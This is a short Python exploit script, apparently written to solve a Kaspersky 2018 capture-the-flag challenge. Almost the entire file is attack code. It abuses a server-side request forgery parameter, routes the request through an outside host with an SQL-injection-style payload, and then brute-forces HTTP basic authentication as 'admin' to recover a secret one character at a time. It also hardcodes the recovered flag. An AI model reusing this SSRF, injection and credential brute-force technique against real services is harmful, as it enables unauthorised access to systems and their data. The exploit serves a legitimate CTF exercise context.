#!/usr/bin/env python
import requests
import string

#url  = 'http://localhost:8080/'
url  = 'http://modcontroller.2018.ctf.kaspersky.com/'
exploit_path = "static?url=http://tool.tonkatsu.info/31rqfwaef.php?x='||substr(P,-{})from K limit 1;'AAAAA"

#cand = string.printable
cand = '{}_' + string.digits + string.ascii_lowercase + string.ascii_uppercase

flag = 'KLCTF{M0dbu5_v14_55RF_n07_345y_}'
new_flag = flag

while not flag.startswith('KLCTF'):
    requests.get(url+exploit_path.format(len(flag)+1))
    for c in cand:
        r = requests.get(url, auth=('admin', c+flag))
        if r.ok:
            new_flag = c+flag
            break

    if new_flag != flag:
        flag = new_flag
        print flag
    else:
        print 'not found'
        break
